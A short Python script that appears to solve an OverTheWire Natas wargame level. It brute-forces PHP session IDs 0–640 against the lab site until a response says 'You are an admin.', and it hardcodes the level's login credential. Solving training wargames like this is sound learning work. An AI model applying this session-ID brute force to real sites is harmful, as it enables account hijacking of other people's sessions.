import requests
from string import *


c = 641
username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
url = f"http://{username}.natas.labs.overthewire.org/"
id = ""

session = requests.Session()


def get_id(seen_id):
    for i in range(c):
        response = session.post(url, auth=(username, password), cookies={'PHPSESSID': f'{i}'})
        if "You are an admin." in response.text:
            print("Found id:", i)
            seen_id = i
            
        else:
            print("Not found:", i)
    return seen_id

pw = get_id(id)
print("Password:", pw)